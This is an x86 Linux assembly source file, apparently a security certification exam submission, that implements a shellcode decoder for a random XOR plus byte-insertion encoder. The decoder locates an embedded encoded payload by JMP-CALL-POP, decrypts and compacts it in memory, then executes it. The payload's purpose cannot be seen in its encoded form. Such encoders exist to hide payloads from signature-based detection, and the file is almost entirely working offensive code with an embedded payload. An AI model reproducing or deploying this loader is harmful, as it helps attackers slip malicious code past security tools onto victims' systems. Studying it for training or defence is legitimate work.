; Filename: decode_randxor.nasm
; Author: Ray Doyle (@doylersec)
; Website: https://www.doyler.net
;
; Purpose: SLAE Exam Assignment #4 - Shellcode Decoder (Linux/x86) for the Random Bytewise XOR + Insertion Encoder

global _start 

section .text

_start:
   ; JMP-CALL-POP
   jmp find_address

decoder:
   ; Get the address of the encoded shellcode into EDI
   pop edi
   push edi
   ; Put the address of the shellcode into ESI as well (this will be used for the insertion decoder)
   pop esi

get_key:
   ; Load the first byte into AL to begin decryption
   mov byte al, [edi]

   ; Push 0x90 onto the stack. By XORing against 0x90, we obtain
   ;     the original encryption key.
   ;
   ; push 0x90 results in 68 90 00 00 00
   ; 6a 90 is 'push 0xffffff90'
   ; We are only using BL, so 0xffffff90 is fine
   push 0xffffff90
   pop ebx   

   ; Verify that we are not at the end of the shellcode.
   ; If we are, begin the insertion decoder.
   cmp al,0xAA
   je decode_insertion

   ; Obtain the original encryption key for the byte pair.
   ; This is calculated by XORing the result vs the signature byte (0x90)
   xor al,bl

decode_xor:
   ; Decrypt the first two bytes with the calculated key, then loop.
   xor byte [edi], al
   inc edi
   xor byte [edi], al
   inc edi
   jmp get_key

decode_insertion:
   ; Counter for the entire shellcode length, starts at 0x90 (first to replace)
   lea edi, [esi]
   ; Clear out the EAX and EBX registers before the decoder process
   xor eax, eax
   xor ebx, ebx

insertion_decoder:
   ; Starting with the first 0x90, load the byte into BL
   mov bl, byte [esi + eax]
   ; XOR agains the signature byte
   xor bl, 0x90
   ; If a non-zero value is returned (should only happen with the marker byte), then the shellcode is decoded
   jnz short encoded
   ; Move the next legit byte (0xcc to start) into BL)
   mov bl, byte [esi + eax + 1]
   ; Moves the legit byte from bl to the "end" of the legit shellcode, replaces the first 0x90 the first run
   mov byte [edi], bl
   ; Increments EDI to point to the end of the legit shellcode (points to the old 0xcc location, shellcode[2]
   inc edi
   ; Increments EAX by 2 (the 0x90 counter)
   add al, 2
   ; Loop
   jmp short insertion_decoder
   
find_address:
   call decoder
   encoded db 0xb7,0xcc,0x3d,0xba,0x0a,0xab,0xf3,0xa3,0x9b,0xbb,0x01,0x95,0x75,0xd4,0xbc,0xf7,0xfa,0xd9,0x1c,0x8d,0xd5,0x1c,0xf7,0x56,0x73,0x31,0xef,0xcd,0xa9,0x34,0x12,0x4f,0x50,0x40,0x71,0xd0,0x94,0xc4,0xf7,0xd7,0x7f,0xee,0x62,0xc3,0x48,0x03,0xd3,0x8e,0x76,0x66,0x2c,0x54,0x0c,0x78,0x05,0x6a,0x37,0x58,0xe4,0x8b,0xdc,0x04,0x3b,0xce,0xb6,0x4a,0xaf,0x53,0x59,0xa6,0xb5,0x05,0xf7,0x30,0x15,0xea,0xeb,0x09,0x9c,0x60,0xe4,0x10,0x7d,0xcc,0x56,0xcc,0xaa